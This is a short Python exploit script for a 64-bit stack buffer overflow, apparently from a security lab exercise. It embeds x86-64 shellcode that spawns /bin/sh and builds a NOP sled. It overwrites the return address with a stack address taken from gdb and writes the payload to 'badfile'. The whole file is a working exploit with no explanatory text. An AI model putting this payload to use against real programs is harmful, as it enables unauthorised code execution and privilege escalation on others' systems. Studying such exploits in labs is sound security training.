#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

off = 0x7fffffffd938 - 0x7fffffffd860
L = 8
BUFF_SIZE = 200

# Fill the content with NOP's
content = bytearray(0x90 for i in range(off+L-2)) 
print("len of shellcode:", len(shellcode))
print("len of content:", off+L-2)

##################################################################
# Put the shellcode somewhere in the payload
start = BUFF_SIZE - L - len(shellcode)    # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x7fffffffd860 + start               # Change this number: NOPs solve the gdb influence  
offset = off                                  # Change this number: (ret addr) - (p &buff) 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:] = (ret).to_bytes(L,byteorder='little')[:-2]  # reuse the 0 in stack
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
